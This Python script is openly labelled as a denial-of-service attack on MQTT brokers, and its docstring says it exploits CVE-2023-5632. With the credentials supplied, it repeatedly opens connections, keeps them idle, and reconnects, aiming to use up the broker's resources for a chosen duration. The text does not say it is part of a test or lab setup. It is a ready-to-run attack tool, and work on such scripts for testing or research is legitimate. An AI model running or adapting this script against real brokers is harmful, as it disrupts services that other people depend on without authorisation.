import argparse

import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time
import random


def main(username, password, duration=10):
    """The empty connection dos attack establishes empty connection with the broker and consumes the resources of the system by exploiting the CVE-2023-5632 vulnerability"""
    reconnect_delay = 10
    connection = util.Connection_status()
    start_time = time.time()

    while True:

        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2, userdata={"connection":connection}, protocol=mqtt.MQTTv311)
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.on_publish = util.on_publish
        if util.connect_client(client, connection, reconnect_delay):
            while connection.connected:
                time.sleep(random.randint(1, 2))
                elapsed_time = time.time() - start_time
                print("Execution time: " + str(elapsed_time))
                if elapsed_time >= duration:
                    return
        else:
            elapsed_time = time.time() - start_time
            print("Execution time: " + str(elapsed_time))
            if elapsed_time >= duration:
                print("Time elapsed, execution is terminating...", flush=True)
                break
            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch an empty_con_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)
